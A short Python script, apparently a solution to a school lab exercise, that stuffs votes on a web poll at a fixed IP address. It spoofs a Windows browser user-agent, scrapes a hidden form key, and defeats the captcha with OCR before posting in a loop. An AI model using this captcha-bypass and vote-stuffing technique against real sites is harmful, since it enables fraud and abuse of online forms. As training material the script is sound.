#!/usr/bin/python3
"""
hodor level 3
Send 1024 votes to my school id with post request to url
user-agent must be a windows machine
extract the hidden key/value w/regeix,
though the hidden key may be hardcoded and able to be a constant
"""
import requests
import re
import pytesseract
from PIL import Image

agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 \
(KHTML, like Gecko) Chrome/79.0.3945.74 Safari/537.36 Edg/79.0.309.43"
# agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:76.0) \
# Gecko/20100101 Firefox/76.0"
datadic = {'id': '111', 'holdthedoor': 'submit'}
target_url = "http://158.69.76.135/level3.php"
captchaurl = target_url + "/captcha.png"
num_votes = 4
reqs_made = 0
fails = 0
headers = {'User-Agent': agent, 'Referer': target_url}
sess = requests.Session()
sess.headers.update(headers)

print("start @ {}".format(reqs_made))
while reqs_made < num_votes and fails < 100:
    try:
        res = sess.get(target_url, headers=headers)
        if res.status_code is not 200:
            continue
        rxget = re.findall("value=\"([^\"]+)\"", res.text)
        datadic["key"] = rxget[0]
#       print(datadic)
        res = sess.get(captchaurl, headers=headers)
        with open('captcha.png', 'wb') as file:
            file.write(res.content)
        datadic["captcha"] = \
            pytesseract.image_to_string(Image.open('captcha.png'))
        print(datadic)
        res = sess.post(target_url, data=datadic)
        if res.status_code is 200:
            fails = 0
            reqs_made += 1
            print("req {} passed".format(reqs_made))
    except Exception as e:
        print(e)
        fails += 1

print("end w/ {} votes passed from 1024".format(reqs_made))
